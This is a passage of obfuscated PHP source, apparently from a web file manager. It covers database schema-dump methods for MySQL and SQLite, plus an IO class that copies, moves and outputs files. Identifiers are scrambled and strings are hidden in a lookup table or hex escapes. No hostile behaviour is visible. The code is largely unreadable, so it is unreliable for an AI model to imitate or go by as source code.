(!$åÕÜíÅš[$Ø²ø¢ö„[13]]) { continue; } fwrite($”¾„¯í, $åÕÜíÅš[$Ø²ø¢ö„[13]] . PHP_EOL . PHP_EOL); if (!in_array($æŞ€¦Ü, $‚Ùº–ÜŒ)) { fwrite($â÷óÅŞ·, $åÕÜíÅš[$Ø²ø¢ö„[881]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ü÷ÓŠÔÎ as $æŞ€¦Ü) { $åÕÜíÅš = $this->sqlFromMysql($æŞ€¦Ü); if (!$åÕÜíÅš[$Ø²ø¢ö„[881]]) { continue; } fwrite($â÷óÅŞ·, $åÕÜíÅš[$Ø²ø¢ö„[881]] . PHP_EOL . PHP_EOL); if (!in_array($æŞ€¦Ü, $‚Ùº–ÜŒ)) { fwrite($”¾„¯í, $åÕÜíÅš[$Ø²ø¢ö„[13]] . PHP_EOL . PHP_EOL); } } } fclose($â÷óÅŞ·); fclose($”¾„¯í); $ıÌäÏÔã = array($Ø²ø¢ö„[881] => $òŸå·’”, $Ø²ø¢ö„[13] => $‡¶Ùï—û); return $‡ÄÃ¢„Ç ? $ıÌäÏÔã[$‡ÄÃ¢„Ç] : $ıÌäÏÔã; } public function dbType($÷¦“’Çñ = false) { $Ñà·Ù°Ÿ =& $_SERVER[´È¥ö†ö]; $ÄÒ©¿êˆ = $÷¦“’Çñ ? $GLOBALS[$Ñà·Ù°Ÿ[6]][$Ñà·Ù°Ÿ[21]] : $this->database; $ÄÒ©¿êˆ = array_change_key_case($ÄÒ©¿êˆ); $ñÏÒû‘ = $ÄÒ©¿êˆ[$Ñà·Ù°Ÿ[1043]]; if ($ñÏÒû‘ == $Ñà·Ù°Ÿ[1040]) { $Éåë÷Şå = explode($Ñà·Ù°Ÿ[4], $ÄÒ©¿êˆ[$Ñà·Ù°Ÿ[1049]]); $ñÏÒû‘ = $Éåë÷Şå[0]; } $¡á¤¨Ìæ = array($Ñà·Ù°Ÿ[1173] => $Ñà·Ù°Ÿ[13], $Ñà·Ù°Ÿ[988] => $Ñà·Ù°Ÿ[881]); if (isset($¡á¤¨Ìæ[$ñÏÒû‘])) { $ñÏÒû‘ = $¡á¤¨Ìæ[$ñÏÒû‘]; } return $ñÏÒû‘; } public function sqlFromMysql($ÅùŠãíÁ, $û¤Š”¯† = '') { $şÜéßúò =& $_SERVER[´È¥ö†ö]; $¿ÄÎõ¨ç = $this->model()->db(); $ıå„ÓÁ  = $¿ÄÎõ¨ç->query($şÜéßúò[1174] . $ÅùŠãíÁ . $şÜéßúò[472]); if (!$ıå„ÓÁ  || !$ıå„ÓÁ [0]) { return !1; } $İ„ï¿µÖ = _get($ıå„ÓÁ [0], $şÜéßúò[1175], $şÜéßúò[12]); if (!$İ„ï¿µÖ) { return !1; } $üƒ¼„„Ğ = "\104\122\117\120\40\124\101\x42\x4c\x45\x20\x49\x46\40\105\130\x49\123\124\x53\x20\140{$ÅùŠãíÁ}\140\x3b" . PHP_EOL . $İ„ï¿µÖ . $şÜéßúò[74]; if ($û¤Š”¯† && $û¤Š”¯† == $şÜéßúò[881]) { return $üƒ¼„„Ğ; } $šı¼Ûü = array_change_key_case($GLOBALS[$şÜéßúò[6]][$şÜéßúò[21]]); $®€õÆí = $šı¼Ûü[$şÜéßúò[1048]]; $æâ‚©€˜ = $şÜéßúò[1176] . $®€õÆí . $şÜéßúò[1177] . $ÅùŠãíÁ . $şÜéßúò[58]; $Ï”üÇóƒ = $şÜéßúò[1178] . $ÅùŠãíÁ . $şÜéßúò[976]; $üø‡†‹¯ = $¿ÄÎõ¨ç->query($æâ‚©€˜); if (empty($üø‡†‹¯)) { $û Ï¨Î‰ = array($şÜéßúò[881] => $şÜéßúò[12], $şÜéßúò[13] => $şÜéßúò[12]); return $û¤Š”¯† ? $û Ï¨Î‰[$û¤Š”¯†] : $û Ï¨Î‰; } $‹İ×†Ì… = $¿ÄÎõ¨ç->query($Ï”üÇóƒ); $Öç†„Å† = $şÜéßúò[12]; $ˆƒ©ü—™ = array(); foreach ($‹İ×†Ì… as $æ®Õğ½) { if (!$Öç†„Å† && $æ®Õğ½[$şÜéßúò[1179]] == $şÜéßúò[1180]) { $Öç†„Å† = $æ®Õğ½[$şÜéßúò[1181]]; } if (isset($ˆƒ©ü—™[$æ®Õğ½[$şÜéßúò[1179]]])) { $ˆƒ©ü—™[$æ®Õğ½[$şÜéßúò[1179]]][$şÜéßúò[1182]][] = $æ®Õğ½[$şÜéßúò[1181]]; continue; } $ˆƒ©ü—™[$æ®Õğ½[$şÜéßúò[1179]]] = array($şÜéßúò[1183] => $æ®Õğ½[$şÜéßúò[1179]], $şÜéßúò[1182] => array($æ®Õğ½[$şÜéßúò[1181]]), $şÜéßúò[1184] => $æ®Õğ½[$şÜéßúò[1185]] == $şÜéßúò[91] ? 0 : 1); } $ˆƒúÃŒ× = array(); foreach ($ˆƒ©ü—™ as $æ®Õğ½) { $üéş¾ì = $æ®Õğ½[$şÜéßúò[1183]] == $şÜéßúò[1180]; $©‡‹ı—Ú = array($şÜéßúò[1186], $æ®Õğ½[$şÜéßúò[1184]] == $şÜéßúò[91] && !$üéş¾ì ? $şÜéßúò[1187] : $şÜéßúò[12], $şÜéßúò[1188], $şÜéßúò[1189] . $ÅùŠãíÁ . $şÜéßúò[11] . ($üéş¾ì ? $şÜéßúò[1190] : $æ®Õğ½[$şÜéßúò[1183]]) . $şÜéßúò[121], $şÜéßúò[1191], $şÜéßúò[121] . $ÅùŠãíÁ . $şÜéßúò[121], $şÜéßúò[1192] . implode($şÜéßúò[1193], $æ®Õğ½[$şÜéßúò[1182]]) . $şÜéßúò[1194]); $ˆƒúÃŒ×[] = implode($şÜéßúò[53], $©‡‹ı—Ú) . $şÜéßúò[74]; } $íø¨‹Ë‚ = array(); $¯Ì­ÜÕ = array($şÜéßúò[1195] => $şÜéßúò[1196], $şÜéßúò[1196] => $şÜéßúò[1196], $şÜéßúò[374] => $şÜéßúò[401], $şÜéßúò[373] => $şÜéßúò[401]); foreach ($üø‡†‹¯ as $æ®Õğ½) { $©‡‹ı—Ú = array($şÜéßúò[121] . $æ®Õğ½[$şÜéßúò[1197]] . $şÜéßúò[121], isset($¯Ì­ÜÕ[$æ®Õğ½[$şÜéßúò[1198]]]) ? $¯Ì­ÜÕ[$æ®Õğ½[$şÜéßúò[1198]]] : $æ®Õğ½[$şÜéßúò[1199]], $æ®Õğ½[$şÜéßúò[1200]] == $şÜéßúò[974] ? $şÜéßúò[1201] : $şÜéßúò[1202], $æ®Õğ½[$şÜéßúò[1197]] == $Öç†„Å† ? $şÜéßúò[1203] : $şÜéßúò[12], $æ®Õğ½[$şÜéßúò[1025]] ? strtoupper(str_replace($şÜéßúò[11], $şÜéßúò[12], $æ®Õğ½[$şÜéßúò[1025]])) : $şÜéßúò[12]); $íø¨‹Ë‚[] = trim(implode($şÜéßúò[53], $©‡‹ı—Ú)); } $Â“„¾ÙÍ = array($şÜéßúò[1204] . $ÅùŠãíÁ . $şÜéßúò[1205], $şÜéßúò[1206] . $ÅùŠãíÁ . $şÜéßúò[1207], implode($şÜéßúò[50] . PHP_EOL, $íø¨‹Ë‚), $şÜéßúò[1022]); $À€Ù¿ü¹ = implode(PHP_EOL, array_merge($Â“„¾ÙÍ, $ˆƒúÃŒ×)); if ($û¤Š”¯† && $û¤Š”¯† == $şÜéßúò[13]) { return $À€Ù¿ü¹; } $û Ï¨Î‰ = array($şÜéßúò[881] => $üƒ¼„„Ğ, $şÜéßúò[13] => $À€Ù¿ü¹); return $û¤Š”¯† ? $û Ï¨Î‰[$û¤Š”¯†] : $û Ï¨Î‰; } public function sqlFromSqlite($‘ÑÌºµ±, $³å«ÌÚè = '') { $ºíš”ûç =& $_SERVER[´È¥ö†ö]; $¡¨íí¨å = $this->model()->db(); $éÈ§ŸŒ = "\x50\122\x41\x47\115\x41\40\x54\x41\x42\114\105\137\111\x4e\106\117\x20\50\47{$‘ÑÌºµ±}\47\x29"; $àÍòş‘Ğ = "\x53\x45\x4c\x45\x43\x54\40\52\40\x46\122\117\x4d\40\163\161\x6c\x69\164\x65\x5f\155\141\163\164\x65\162\x20\x57\110\x45\122\105\40\164\x62\x6c\x5f\x6e\141\x6d\145\40\75\40\x27{$‘ÑÌºµ±}\47"; $òçñĞ€ = $¡¨íí¨å->query($éÈ§ŸŒ); if (empty($òçñĞ€)) { $¨Å¥‹’€ = array($ºíš”ûç[881] => $ºíš”ûç[12], $ºíš”ûç[13] => $ºíš”ûç[12]); return $³å«ÌÚè ? $¨Å¥‹’€[$³å«ÌÚè] : $¨Å¥‹’€; } $±¡ÒøÎ² = $¡¨íí¨å->query($àÍòş‘Ğ); $ôÑ…©‰€ = $İ ı©ƒ = array(); foreach ($±¡ÒøÎ² as $ğ¿‘ÅğÄ) { if ($ğ¿‘ÅğÄ[$ºíš”ûç[33]] == $ºíš”ûç[367]) { $ôÑ…©‰€[] = $ğ¿‘ÅğÄ[$ºíš”ûç[1208]]; } else { $İ ı©ƒ[$ğ¿‘ÅğÄ[$ºíš”ûç[32]]] = $ğ¿‘ÅğÄ[$ºíš”ûç[1208]]; } } $®û„´Ì = array_merge(array($ºíš”ûç[1204] . $‘ÑÌºµ± . $ºíš”ûç[121]), $ôÑ…©‰€, array_values($İ ı©ƒ)); $®û„´Ì = implode($ºíš”ûç[74] . PHP_EOL, $®û„´Ì) . $ºíš”ûç[74]; if ($³å«ÌÚè && $³å«ÌÚè == $ºíš”ûç[13]) { return $®û„´Ì; } $¡·íÏè = array(); foreach ($İ ı©ƒ as $İÓÛ‡×Ï => $Ÿ¼ù…¢) { $†âÈ»Ğ = str_replace($ºíš”ûç[1209] . $‘ÑÌºµ± . $ºíš”ûç[11], $ºíš”ûç[12], $İÓÛ‡×Ï); $†âÈ»Ğ = str_replace($‘ÑÌºµ± . $ºíš”ûç[11], $ºíš”ûç[12], $İÓÛ‡×Ï); $ü‚¦ªà· = str_replace(array($ºíš”ûç[121], $ºíš”ûç[1033]), $ºíš”ûç[472], substr($Ÿ¼ù…¢, stripos($Ÿ¼ù…¢, $ºíš”ûç[348]))); $¡·íÏè[$†âÈ»Ğ] = $ü‚¦ªà·; } $‹„ø¡Òæ = array(); $Åõ†ãÍ‹ = array($ºíš”ûç[1196] => $ºíš”ûç[1210], $ºíš”ûç[401] => $ºíš”ûç[1211]); $¾¦ş¼ù = $–‰Ë„ = $ºíš”ûç[12]; foreach ($òçñĞ€ as $ğ¿‘ÅğÄ) { if ($ğ¿‘ÅğÄ[$ºíš”ûç[57]] == $ºíš”ûç[91]) { $¾¦ş¼ù = $ğ¿‘ÅğÄ[$ºíš”ûç[32]]; } $ìü…­éı = $ğ¿‘ÅğÄ[$ºíš”ûç[33]]; if ($ìü…­éı == $ºíš”ûç[1212] && isset($¡·íÏè[$ğ¿‘ÅğÄ[$ºíš”ûç[32]]])) { $ìü…­éı = $ºíš”ûç[1213]; } $éÂ—­”ä = array($ºíš”ûç[472] . $ğ¿‘ÅğÄ[$ºíš”ûç[32]] . $ºíš”ûç[472], _get($Åõ†ãÍ‹, $ìü…­éı, $ìü…­éı), $ğ¿‘ÅğÄ[$ºíš”ûç[35]] == $ºíš”ûç[91] ? $ºíš”ûç[1201] : $ºíš”ûç[1214] . $ğ¿‘ÅğÄ[$ºíš”ûç[56]], $ğ¿‘ÅğÄ[$ºíš”ûç[57]] == $ºíš”ûç[91] ? $ºíš”ûç[1215] : $ºíš”ûç[12]); $‹„ø¡Òæ[] = trim(implode($ºíš”ûç[53], $éÂ—­”ä)); } foreach ($¡·íÏè as $†âÈ»Ğ => $ü‚¦ªà·) { if ($†âÈ»Ğ == $ºíš”ûç[1190]) { $¡³à¾² = $–‰Ë„ = $ºíš”ûç[1216] . $¾¦ş¼ù . $ºíš”ûç[1217]; } else { $¡³à¾² = (stripos($†âÈ»Ğ, $ºíš”ûç[11]) ? $ºíš”ûç[1218] : $ºíš”ûç[12]) . ($ºíš”ûç[1219] . $†âÈ»Ğ . $ºíš”ûç[1220] . $ü‚¦ªà·); } $‹„ø¡Òæ[] = $¡³à¾²; } if ($¾¦ş¼ù && !$–‰Ë„) { $‹„ø¡Òæ = array_merge(array($ºíš”ûç[1216] . $¾¦ş¼ù . $ºíš”ûç[1217]), $‹„ø¡Òæ); } $´»ñÃ“ = array($ºíš”ûç[1221] . $‘ÑÌºµ± . $ºíš”ûç[1222], $ºíš”ûç[1223] . $‘ÑÌºµ± . $ºíš”ûç[1224], implode($ºíš”ûç[50] . PHP_EOL, $‹„ø¡Òæ), $ºíš”ûç[1225]); $ÂÑ¿ğÇÈ = implode(PHP_EOL, $´»ñÃ“); if ($³å«ÌÚè && $³å«ÌÚè == $ºíš”ûç[881]) { return $ÂÑ¿ğÇÈ; } $¨Å¥‹’€ = array($ºíš”ûç[881] => $ÂÑ¿ğÇÈ, $ºíš”ûç[13] => $®û„´Ì); return $³å«ÌÚè ? $¨Å¥‹’€[$³å«ÌÚè] : $¨Å¥‹’€; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($»¥‰Ì©Æ, $â¼ÓòÔå) { $×„ğŸÕ¾ =& $_SERVER[´È¥ö†ö]; $¡ì€ö“ë = $â¼ÓòÔå; $GLOBALS[$×„ğŸÕ¾[1226]] = $×„ğŸÕ¾[1227] . $»¥‰Ì©Æ; Hook::trigger($×„ğŸÕ¾[1227] . $»¥‰Ì©Æ . $×„ğŸÕ¾[1228], $¡ì€ö“ë); $¾³¦ĞÍÅ = self::driverMake($â¼ÓòÔå[0]); if (!$¾³¦ĞÍÅ) { return !1; } if (method_exists($¾³¦ĞÍÅ, $»¥‰Ì©Æ)) { $ŒÙ–ÚĞ = @call_user_func_array(array($¾³¦ĞÍÅ, $»¥‰Ì©Æ), $â¼ÓòÔå); } else { if (method_exists($¾³¦ĞÍÅ, $×„ğŸÕ¾[1229])) { $ŒÙ–ÚĞ = @call_user_func_array(array($¾³¦ĞÍÅ, $»¥‰Ì©Æ), $â¼ÓòÔå); } else { if (method_exists(self, $»¥‰Ì©Æ)) { $ŒÙ–ÚĞ = @call_user_func_array(array(self, $»¥‰Ì©Æ), $â¼ÓòÔå); } else { $ŒÙ–ÚĞ = call_user_func_array(array(parent, $»¥‰Ì©Æ), $â¼ÓòÔå); } } } Hook::trigger($×„ğŸÕ¾[1227] . $»¥‰Ì©Æ . $×„ğŸÕ¾[1230], $¡ì€ö“ë, $ŒÙ–ÚĞ); return $ŒÙ–ÚĞ; } public static function init($­ï…²²Ş) { return self::driverMake($­ï…²²Ş); } public static function copy($ŞºÏÕı², $­½é¾Ì’, $à¢ïß« = false, $Äí¬ ”Î = false) { return self::copyMoveStart($ŞºÏÕı², $­½é¾Ì’, $à¢ïß«, $_SERVER[´È¥ö†ö][632], $Äí¬ ”Î); } public static function move($´ü…×—ı, $Åç±İŞ, $÷Å’¤Ø× = false, $™Â½ßå÷ = false) { return self::copyMoveStart($´ü…×—ı, $Åç±İŞ, $÷Å’¤Ø×, $_SERVER[´È¥ö†ö][634], $™Â½ßå÷); } public static function copyMoveChildren($ñåÜÃ, $ÂóƒÚÌÌ, $Á»ùÁş = "\x63\x6f\x70\x79", $œà‰çÔª = REPEAT_REPLACE) { $©’ë­çÀ =& $_SERVER[´È¥ö†ö]; $ê‹¤Ñ¥ô = $ñåÜÃ; $¬ëëÊú¢ = self::driverMake($ñåÜÃ); $¥çüØÃŞ = $¬ëëÊú¢->listPath($ñåÜÃ, !0); $‚ü¶½·¥ = array_merge($¥çüØÃŞ[$©’ë­çÀ[86]], $¥çüØÃŞ[$©’ë­çÀ[85]]); foreach ($‚ü¶½·¥ as $¶íñÆâ°) { self::copyMoveStart($¶íñÆâ°[$©’ë­çÀ[87]], $ÂóƒÚÌÌ, $œà‰çÔª, $Á»ùÁş, !1); } if ($Á»ùÁş == $©’ë­çÀ[634]) { self::remove($ê‹¤Ñ¥ô); } } private static function copyMoveStart($™¥ãÊ½µ, $°ˆ¬Ş’ò, $¢³—ÎŸê, $ŸöÑ²ú, $«Çï³ ) { $Æ­ğô·÷ =& $_SERVER[´È¥ö†ö]; $’ğğê÷ = array($™¥ãÊ½µ, $°ˆ¬Ş’ò, $¢³—ÎŸê, $«Çï³ ); Hook::trigger($Æ­ğô·÷[1227] . $ŸöÑ²ú . $Æ­ğô·÷[1228], $’ğğê÷); $›•íìü = self::copyMove($™¥ãÊ½µ, $°ˆ¬Ş’ò, $¢³—ÎŸê, $ŸöÑ²ú, $«Çï³ ); Hook::trigger($Æ­ğô·÷[1227] . $ŸöÑ²ú . $Æ­ğô·÷[1230], $’ğğê÷, $›•íìü); return $›•íìü; } public static function saveFile($Ã±–ôçã, $²Ã™£•, $óäµÕ¼Ã = true) { $öšîÊ¸Ş =& $_SERVER[´È¥ö†ö]; $ãŒÀ‘¯Ş = self::info($²Ã™£•); $¾Ô±ŠÁ = self::driverMake($Ã±–ôçã); $èüÑˆØ¾ = self::driverMake($²Ã™£•); $¬‘ÆÃ±î = !1; if ($èüÑˆØ¾->pathParse[$öšîÊ¸Ş[1231]]) { $¬‘ÆÃ±î = $èüÑˆØ¾; $íÊè = $èüÑˆØ¾->pathParse[$öšîÊ¸Ş[1231]]; $èüÑˆØ¾ = self::driverMake($íÊè); } if ($¾Ô±ŠÁ->pathParse[$öšîÊ¸Ş[1231]]) { $¬Òû×Ú¢ = $¾Ô±ŠÁ->pathParse[$öšîÊ¸Ş[1231]]; $¾Ô±ŠÁ = self::driverMake($¬Òû×Ú¢); } $Ù¹à³Öô = $èüÑˆØ¾->pathFather($²Ã™£•); $Ã£–…Ş = !0; if (!$óäµÕ¼Ã && self::driverIsSame($¾Ô±ŠÁ, $èüÑˆØ¾)) { $Ã£–…Ş = !1; } $ˆÆÇ¨‘˜ = self::copyFile($¾Ô±ŠÁ, $Ã±–ôçã, $èüÑˆØ¾, $Ù¹à³Öô, $ãŒÀ‘¯Ş[$öšîÊ¸Ş[32]], $Ã£–…Ş); if ($¬‘ÆÃ±î) { $ˆÆÇ¨‘˜ = $¬‘ÆÃ±î->getPathOuter($ˆÆÇ¨‘˜); } return $ˆÆÇ¨‘˜; } private static function copyMove($ÂóËúü, $¾¼á†¢, $‡ı¼¼şñ, $‘‚«ğ Ø, $ÎÇÔ³“Ã = false) { $¯´ä¼¸Õ =& $_SERVER[´È¥ö†ö]; if (!$ÂóËúü || $ÂóËúü == $¯´ä¼¸Õ[8] || !$¾¼á†¢) { return !1; } ignore_timeout(); $‘•¬€ = self::driverMake($ÂóËúü); $şô‚ÅÛ‡ = self::driverMake($¾¼á†¢); $¦ĞÏÈğ = $‘‚«ğ Ø == $¯´ä¼¸Õ[634]; $µ˜¿Ÿ…ê = !1; if ($şô‚ÅÛ‡->pathParse[$¯´ä¼¸Õ[1231]]) { $µ˜¿Ÿ…ê = $şô‚ÅÛ‡; $¾¼á†¢ = $şô‚ÅÛ‡->pathParse[$¯´ä¼¸Õ[1231]]; $şô‚ÅÛ‡ = self::driverMake($¾¼á†¢); } if ($‘•¬€->pathParse[$¯´ä¼¸Õ[1231]]) { $ÂóËúü = $‘•¬€->pathParse[$¯´ä¼¸Õ[1231]]; $‘•¬€ = self::driverMake($ÂóËúü); } self::check($‘•¬€, $ÂóËúü, $şô‚ÅÛ‡, $¾¼á†¢); Hook::trigger($¯´ä¼¸Õ[1232], $‘•¬€, $ÂóËúü, $şô‚ÅÛ‡, $¾¼á†¢); $ÅÃœÃ®Å = self::driverIsSame($‘•¬€, $şô‚ÅÛ‡); if ($ÅÃœÃ®Å) { if ($‘‚«ğ Ø == $¯´ä¼¸Õ[634] && !method_exists($şô‚ÅÛ‡, $¯´ä¼¸Õ[1233]) && trim($¾¼á†¢, $¯´ä¼¸Õ[8]) == trim($şô‚ÅÛ‡->pathFather($ÂóËúü), $¯´ä¼¸Õ[8])) { if ($‘•¬€->pathThis($ÂóËúü) != $ÎÇÔ³“Ã && !$‘•¬€->isOsDriver()) { return $‘•¬€->rename($ÂóËúü, $ÎÇÔ³“Ã); } return $şô‚ÅÛ‡->getPathOuter($ÂóËúü); } if (method_exists($şô‚ÅÛ‡, $‘‚«ğ Ø)) { return $şô‚ÅÛ‡->{$‘‚«ğ Ø}($ÂóËúü, $¾¼á†¢, $‡ı¼¼şñ, $ÎÇÔ³“Ã); } } if ($ÅÃœÃ®Å && $‘‚«ğ Ø == $¯´ä¼¸Õ[634] && $şô‚ÅÛ‡->getType() == $¯´ä¼¸Õ[109]) { $½·¿Òé = $şô‚ÅÛ‡->movePath($ÂóËúü, $¾¼á†¢, $ÎÇÔ³“Ã); if ($½·¿Òé) { return $½·¿Òé; } } $Ù¥ìêìş = $‘•¬€->isFile($ÂóËúü); if (!$Ù¥ìêìş && $şô‚ÅÛ‡->getType() == $¯´ä¼¸Õ[833] && $‘•¬€->getType() == $¯´ä¼¸Õ[109]) { $½·¿Òé = $şô‚ÅÛ‡->copyFolderFromIO($‘•¬€, $ÂóËúü, $¾¼á†¢, $‡ı¼¼şñ, $¦ĞÏÈğ, $ÎÇÔ³“Ã); } else { $½·¿Òé = self::copyPath($‘•¬€, $ÂóËúü, $şô‚ÅÛ‡, $¾¼á†¢, $‡ı¼¼şñ, $¦ĞÏÈğ, $Ù¥ìêìş, $ÎÇÔ³“Ã); } if ($½·¿Òé && $¦ĞÏÈğ) { $‘•¬€->remove($ÂóËúü); } if ($µ˜¿Ÿ…ê) { $½·¿Òé = $µ˜¿Ÿ…ê->getPathOuter($½·¿Òé); } return $½·¿Òé; } private static function check($£ùèî°, $ºÄÖÀÄ†, $Ë¨¾ÆîÓ, &$İìïïÈç) { $‘Öí› =& $_SERVER[´È¥ö†ö]; if (self::driverIsSame($£ùèî°, $Ë¨¾ÆîÓ) && $£ùèî°->isFolder($ºÄÖÀÄ†) && $£ùèî°->isParentOf($ºÄÖÀÄ†, $İìïïÈç)) { show_json(LNG($‘Öí›[1234]), !1); } if (!$£ùèî°->exist($ºÄÖÀÄ†)) { show_json(LNG($‘Öí›[108]), !1); } } private static function copyPath($—ìÆ¤—İ, $ú¯Ûœèí, $“¼û¢Ëš, $ğŠ©ù–¥, $€ì«ğ”, $ªŸƒäºƒ, $¡ˆØúšœ, $ñÕ¨†ªş = false, $íÆ´¬¨ = true) { $×’Ó¬Ï =& $_SERVER[´È¥ö†ö]; $ß’×ù´Ğ = empty($ñÕ¨†ªş) && $ñÕ¨†ªş !== $×’Ó¬Ï[230] ? $—ìÆ¤—İ->pathThis($ú¯Ûœèí) : $ñÕ¨†ªş; if ($€ì«ğ”) { $‚œÛı´Â = $“¼û¢Ëš->fileNameExist($ğŠ©ù–¥, $ß’×ù´Ğ); $ê—Æ¡ = $ß’×ù´Ğ; $ß’×ù´Ğ = $“¼û¢Ëš->fileNameAuto($ğŠ©ù–¥, $ß’×ù´Ğ, $€ì«ğ”, !$¡ˆØúšœ); if (!$‚œÛı´Â || $ê—Æ¡ != $ß’×ù´Ğ) { $€ì«ğ” = !1; } if ($íÆ´¬¨ && !$€ì«ğ”) { $“¼û¢Ëš->_data[$×’Ó¬Ï[1235]] = !0; } } if ($¡ˆØúšœ) { return self::copyFile($—ìÆ¤—İ, $ú¯Ûœèí, $“¼û¢Ëš, $ğŠ©ù–¥, $ß’×ù´Ğ, $ªŸƒäºƒ); } if ($€ì«ğ” == REPEAT_RENAME_FOLDER) { $€ì«ğ” = !1; } $ÅªñÓÙª = rtrim($ğŠ©ù–¥, $×’Ó¬Ï[8]) . $×’Ó¬Ï[8] . $ß’×ù´Ğ; $ü•‡†‘¨ = $“¼û¢Ëš->mkdir($“¼û¢Ëš->getPath($ÅªñÓÙª), $€ì«ğ”); $ğŠ©ù–¥ = $“¼û¢Ëš->getPathInner($ü•‡†‘¨); $ÁÚÆÖµš = $—ìÆ¤—İ->listPath($ú¯Ûœèí, !0); $ÁÚÆÖµš = is_array($ÁÚÆÖµš) ? $ÁÚÆÖµš : array($×’Ó¬Ï[86] => array(), $×’Ó¬Ï[85] => array()); $Ê¢æÛ¥– = array_merge($ÁÚÆÖµš[$×’Ó¬Ï[86]], $ÁÚÆÖµš[$×’Ó¬Ï[85]]); foreach ($Ê¢æÛ¥– as $¼ö…Öî³) { $è®ÑŠ ‰ = $¼ö…Öî³[$×’Ó¬Ï[33]] == $×’Ó¬Ï[232]; $ú¯Ûœèí = $—ìÆ¤—İ->getPathInner($¼ö…Öî³[$×’Ó¬Ï[87]]); $èÅíßƒ = self::copyPath($—ìÆ¤—İ, $ú¯Ûœèí, $“¼û¢Ëš, $ğŠ©ù–¥, $€ì«ğ”, $ªŸƒäºƒ, $è®ÑŠ ‰, !1, !1); if (!$èÅíßƒ) { IO::errorTips($×’Ó¬Ï[1236] . $ú¯Ûœèí . $×’Ó¬Ï[73] . $ğŠ©ù–¥); } } self::copyMoveKeepInfo($—ìÆ¤—İ, $ú¯Ûœèí, $ü•‡†‘¨); return $ü•‡†‘¨; } private static function copyFile($×ƒÃıæÂ, $İıÌƒ, $–š…ïùœ, $æ°Ê©ÕÛ, $ÖÚ§¾•„, $ÇÉ—ã¦Û) { $éœÑ„Ëç =& $_SERVER[´È¥ö†ö]; $æ°Ê©ÕÛ = $–š…ïùœ->getPath(rtrim($æ°Ê©ÕÛ, $éœÑ„Ëç[8]) . $éœÑ„Ëç[8] . $ÖÚ§¾•„); $›Çù»Ñ„ = $éœÑ„Ëç[1237] . time() . rand_string(5); Hook::trigger($éœÑ„Ëç[1238], $×ƒÃıæÂ, $İıÌƒ, $–š…ïùœ, $æ°Ê©ÕÛ, $ÖÚ§¾•„, $›Çù»Ñ„); if (self::driverIsSame($×ƒÃıæÂ, $–š…ïùœ)) { if ($ÇÉ—ã¦Û) { $ßšÒÜÉ„ = $–š…ïùœ->moveFile($İıÌƒ, $æ°Ê©ÕÛ); } else { $ßšÒÜÉ„ = $–š…ïùœ->copyFile($İıÌƒ, $æ°Ê©ÕÛ); } Hook::trigger($éœÑ„Ëç[1239], $×ƒÃıæÂ, $İıÌƒ, $–š…ïùœ, $æ°Ê©ÕÛ, $ÖÚ§¾•„, $ßšÒÜÉ„); self::copyMoveKeepInfo($×ƒÃıæÂ, $İıÌƒ, $ßšÒÜÉ„); return $ßšÒÜÉ„; } $ËåôÇ¨” = TEMP_FILES; if ($GLOBALS[$éœÑ„Ëç[6]][$éœÑ„Ëç[92]][$éœÑ„Ëç[873]]) { $ËåôÇ¨” = $GLOBALS[$éœÑ„Ëç[6]][$éœÑ„Ëç[92]][$éœÑ„Ëç[873]]; } $ëë—¢Ã‘ = $ËåôÇ¨”; mk_dir($ëë—¢Ã‘); $“ì–º¿¿ = $ëë—¢Ã‘ . $›Çù»Ñ„; $æâ“ş£ = $“ì–º¿¿; $“ì–º¿¿ = $×ƒÃıæÂ->download($İıÌƒ, $“ì–º¿¿); $“ì–º¿¿ = $×ƒÃıæÂ->iconvApp($“ì–º¿¿); if (substr($“ì–º¿¿, strlen($ËåôÇ¨”)) == $ËåôÇ¨”) { $ÇÉ—ã¦Û = !0; } $ßšÒÜÉ„ = $–š…ïùœ->upload($æ°Ê©ÕÛ, $“ì–º¿¿, $ÇÉ—ã¦Û); self::remove($æâ“ş£); Hook::trigger($éœÑ„Ëç[1239], $×ƒÃıæÂ, $İıÌƒ, $–š…ïùœ, $æ°Ê©ÕÛ, $ÖÚ§¾•„, $ßšÒÜÉ„); self::copyMoveKeepInfo($×ƒÃıæÂ, $İıÌƒ, $ßšÒÜÉ„); return $ßšÒÜÉ„; } private static function copyMoveKeepInfo($‚™¢Ğäé, $€şªö»’, $Ù¡æüº›) { if (!$Ù¡æüº›) { return; } $áÁ­¢ = $‚™¢Ğäé->info($€şªö»’); if (!is_array($áÁ­¢)) { return; } IO::setModifyTime($Ù¡æüº›, $áÁ­¢[$_SERVER[´È¥ö†ö][88]]); } public static function pathFather($ôÄæ¤·§) { $ªó»Œèû = IO::init($ôÄæ¤·§); $ˆŸÁÇ”‚ = $ªó»Œèû->pathFather($ªó»Œèû->path); return $ªó»Œèû->getPathOuter($ˆŸÁÇ”‚); } public static function fileOut($îƒ–íĞº, $ÙÕı­ç = false, $Â‘û™ó = false, $Ÿ¸ÚŞóª = '') { $Ö¶¾Ëˆ­ = self::driverMake($îƒ–íĞº); if ($Ö¶¾Ëˆ­->isFileOutServer()) { return $Ö¶¾Ëˆ­->fileOutServer($îƒ–íĞº, $ÙÕı­ç, $Â‘û™ó, $Ÿ¸ÚŞóª); } return $Ö¶¾Ëˆ­->fileOut($îƒ–íĞº, $ÙÕı­ç, $Â‘û™ó, $Ÿ¸ÚŞóª); } public static function fileOutImage($ÖÀ·Í¬¬, $³£à£¡ = 250) { $Ø‹Òô˜Ù = array(250, 600, 1200, 2000, 3000, 5000); for ($­Ö°¡íÙ = 0; $­Ö°¡íÙ < count($Ø‹Òô˜Ù); $­Ö°¡íÙ++) { if ($­Ö°¡íÙ == 0 && $³£à£¡ <= $Ø‹Òô˜Ù[$­Ö°¡íÙ]) { $³£à£¡ = $Ø‹Òô˜Ù[$­Ö°¡íÙ]; break; } else { if ($³£à£¡ > $Ø‹Òô˜Ù[$­Ö°¡íÙ - 1] && $³£à£¡ <= $Ø‹Òô˜Ù[$­Ö°¡íÙ]) { $³£à£¡ = $Ø‹Òô˜Ù[$­Ö°¡íÙ]; break; } else { if ($­Ö°¡íÙ == count($Ø‹Òô˜Ù) - 1 && $³£à£¡ > $Ø‹Òô˜Ù[$­Ö°¡íÙ]) { $³£à£¡ = $Ø‹Òô˜Ù[$­Ö°¡íÙ]; break; } } } } $èèˆß¡ = self::driverMake($ÖÀ·Í¬¬); if ($èèˆß¡->isFileOutServer()) { return 